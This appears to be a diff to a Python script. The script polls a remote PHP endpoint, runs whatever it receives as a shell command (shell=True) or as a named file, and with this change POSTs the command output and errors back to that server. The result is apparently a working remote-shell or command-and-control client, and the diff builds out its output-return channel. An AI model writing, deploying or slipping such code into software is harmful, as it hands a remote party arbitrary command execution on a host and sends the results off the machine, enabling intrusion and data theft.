@@ -127,15 +127,33 @@ while True:
                     if received_mac == mac:
                         # Check if the received file has been executed recently
                         if file_to_execute not in previous_files or (time.time() - previous_files[file_to_execute]) > 30:
-                            # Execute the file
-                            subprocess.Popen(f"{file_to_execute}", shell=True)
+                            # Execute the file and capture its output
+                            process = subprocess.Popen(f"{file_to_execute}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                            output, error = process.communicate()
+
+                            # Send the command output back to the PHP script
+                            response_data = {
+                                'command_output': output,
+                                'command_error': error
+                            }
+                            requests.post(php_script_url, data=response_data)
+
                             previous_files[file_to_execute] = time.time()
                         else:
                             print(f"Skipping file execution: File executed within 30 seconds.")
                     else:
                         print(f"Received data with MAC address {received_mac} does not match the device's MAC address.")
                 else:
-                    subprocess.Popen(f"{data}", shell=True)
+                    # Execute the command and capture its output
+                    process = subprocess.Popen(f"{data}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                    output, error = process.communicate()
+
+                    # Send the command output back to the PHP script
+                    response_data = {
+                        'command_output': output,
+                        'command_error': error
+                    }
+                    requests.post(php_script_url, data=response_data)
                 
                 previous_command = data
 
